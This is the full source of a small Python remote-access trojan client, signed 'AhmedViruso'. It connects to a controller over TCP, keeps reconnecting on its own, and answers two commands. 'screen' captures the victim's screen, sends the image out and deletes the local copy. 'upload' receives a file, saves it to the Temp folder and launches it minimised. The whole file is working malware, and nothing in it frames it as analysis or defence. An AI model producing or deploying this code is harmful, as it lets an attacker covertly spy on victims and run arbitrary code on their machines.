# Python 3
# AhmedViruso

try:
    import socket,os,time,random,string
    from PIL import ImageGrab
except:
	exit()


def Create(): # Create Tcp Socket
    global Ip
    global Port
    global S

    try:
        
        Ip = '127.0.0.1' # You Can use socket.gethostbyname( Hostname[noip] )
        Port = 519

        S = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    except:
        time.sleep(3)
        Create()


def Connect(): # Connect To Socket

    try:

        S.connect((Ip, Port))

    except:
    	time.sleep(3)
    	Connect()


def ExecuteOrders():

    while True:

        try: # Check If Server is online
            Data = S.recv(1024)
            Data = Data.decode("utf-8")

        except: # Reconnect
            Main()
            continue
            
        if(Data == 'screen'): 

            try:

                Random = string.ascii_uppercase + string.digits # Random String Settings

                Snapshot = ImageGrab.grab() # Taking Screenshot

                Temp = os.getenv('Temp') # Get Temp Path

                Random = ''.join(random.sample(Random*6, 6)) # Random String

                Path = Temp+"/"+Random+".jpg" # Path to save screenshot

                Snapshot.save(Path)

                with open(Path, "rb") as F:
                    Data = F.read() # Read File Bytes
                    S.sendall(Data) # Send the Screenshot

                F.close() # Close The File

                os.remove(Path) # Delete Screenshot after sending it to server

            except:
            	continue


        elif(Data == 'upload'):
            try:
            	S.send(str.encode("file"))
            	Ex = S.recv(1024)
            	Ex = Ex.decode("utf-8")
            	Temp = os.getenv('Temp') # Get Temp Path
            	Random = string.ascii_uppercase + string.digits # Random String Settings
            	Random = ''.join(random.sample(Random*6, 6)) # Random String
            	F = open(Temp+"/"+Random+"."+Ex, "wb")
            	while True:
                    Data = S.recv(1024) # Receive File Bytes
                    F.write(Data)
                    Check = len(Data)
                    print(Check)
                    if(1024 != Check): # If 1024 > len(Data) ; Stop Loop
                        F.close() # Close File
                        os.system('start /min '+Temp+"/"+Random+"."+Ex)
                        break
            except:
            	continue


def Main():
    
    Create()
    Connect()
    ExecuteOrders()


Main()
